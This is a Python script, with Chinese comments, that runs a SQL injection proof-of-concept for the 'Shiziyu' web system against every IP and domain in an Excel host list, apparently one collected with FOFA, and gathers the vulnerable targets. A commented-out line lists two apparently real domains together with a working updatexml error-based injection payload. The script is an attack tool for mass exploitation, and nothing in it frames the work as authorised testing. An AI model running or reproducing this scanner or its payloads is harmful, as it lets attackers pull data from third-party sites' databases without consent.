import argparse
import re

import colorama
import  pandas  as pd
import requests
import xlsxwriter
import openpyxl
from script import shiziyu_sql

class test_sql:
    def test_file(filename):
            df = pd.read_excel(filename)
            sqltest = shiziyu_sql.shiziyu_sql
            result = ""
            count = 1
            #对域名进行检测
            for i in range(len(df)):
                ip_test= str(df.iloc[i, 0])
                domain = str(df.iloc[i, 1])
                if (str(domain) != "nan") and (str(sqltest.POC("www."+domain)) != "None"):
                        if count==1:
                                result = str(sqltest.POC("www."+domain))
                                count=2

                        else:
                                result = result+"**"+str(sqltest.POC(domain))#"www."+domain
                        continue
                #对ip进行检测
                if str(sqltest.POC(ip_test)) != "None":
                    if count == 1:
                        result = str(sqltest.POC(ip_test))
                        count = 2
                    else:
                        result = result + "**" + str(sqltest.POC(ip_test))  # "www."+domain
            #print("result:"+result)
            result=result.split("**")
            #print(result)
            return result

    # parser = argparse.ArgumentParser(
    #         description="fofa采集工具")
    # parser.add_argument('-f', '--filename', help='需要测试的excel文件,在/result/下',default="./result/sql.xlsx")
    # #调用狮子鱼sql注入脚本中的poc
    # args = parser.parse_args()#print(args.query)
    # filename = args.filename

    #result1=test_file(filename)
    #result1=result1.split("**")

    # re1=['http://www.kaola88.cn/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)', 'http://www.gdlywh.com/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)']
